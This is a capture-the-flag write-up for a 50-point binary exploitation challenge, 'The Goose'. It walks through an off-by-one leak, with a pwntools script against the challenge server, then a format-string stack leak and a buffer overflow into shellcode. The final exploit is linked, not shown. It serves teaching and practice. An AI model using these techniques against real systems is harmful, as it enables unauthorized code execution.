#  The Goose

**Challenge Description**:
When the honking gets tough, you better brush up on your basics.

**Points**:
50

**Solution**:
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
Stack is executeable and there is no canary.
Okay. First the program expects us to send a username, and then guess a number between 10 and 100. I guess this could be done manually - however - there is a off-by-one vulnerability here. We can fill the entire buffer of our username, and then it will leak the byte containing the number that we're supposed to guess. 
Neat! Then we have the first part of our solution script:
```python
from pwn import *

e = ELF('./chall')
# p = e.process()
p = remote('34.45.81.67', 16004)

context.binary = e
context.arch = 'amd64'
p.sendlineafter(b'> ', b'A'*64)
p.recvuntil(b'A'*64)
nLeak = p.recvuntil(b'.').replace(b'.', b'')
nLeakInt = int.from_bytes(nLeak, 'little')
print("Leaked number: ", nLeakInt)
p.sendlineafter(b'how many honks?', f'{nLeakInt}'.encode())
```
This will lead us into this function:
```c
void highscore(void) {
  undefined1 local_178 [128];
  char local_f8 [31];
  undefined1 local_d9;
  undefined1 local_78 [32];
  char local_58 [80];
  
  builtin_strncpy(local_58,
                  "wow %s you\'re so good. what message would you like to leave to the world?",0x4a)
  ;
  printf("what\'s your name again?");
  __isoc99_scanf(&DAT_001024eb,local_78);
  local_d9 = 0;
  sprintf(local_f8,local_58,local_78);
  printf(local_f8);
  read(0,local_178,0x400);
  printf("got it. bye now.");
  return;
}
```
I quickly noticed 2 things. There is a format string vulnerability and we can overflow `local_178`
That menas that we need to leak an adress to the stack. First we can send `%p` to the `scanf` which will leak the address of `stack + 0x126`. Then we fill the stack with our shell script (generated by pwntools) and jump to it.
[Solution script](./exploit.py)